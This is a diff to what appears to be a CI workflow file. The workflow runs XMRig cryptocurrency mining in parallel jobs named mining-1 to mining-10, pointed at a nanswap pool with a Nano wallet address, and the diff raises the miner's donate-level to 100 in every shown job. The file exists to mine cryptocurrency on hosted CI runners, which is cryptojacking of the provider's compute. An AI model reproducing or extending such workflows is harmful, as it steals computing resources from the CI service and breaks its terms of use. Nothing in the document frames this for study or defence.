@@ -23,7 +23,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-2:
     runs-on: ubuntu-latest
@@ -42,7 +42,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-3:
     runs-on: ubuntu-latest
@@ -61,7 +61,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-4:
     runs-on: ubuntu-latest
@@ -80,7 +80,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-5:
     runs-on: ubuntu-latest
@@ -99,7 +99,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-6:
     runs-on: ubuntu-latest
@@ -118,7 +118,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=10
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-7:
     runs-on: ubuntu-latest
@@ -137,7 +137,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-8:
     runs-on: ubuntu-latest
@@ -156,7 +156,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-9:
     runs-on: ubuntu-latest
@@ -175,7 +175,7 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=10
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
 
   mining-10:
     runs-on: ubuntu-latest
@@ -194,4 +194,4 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=50
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=100
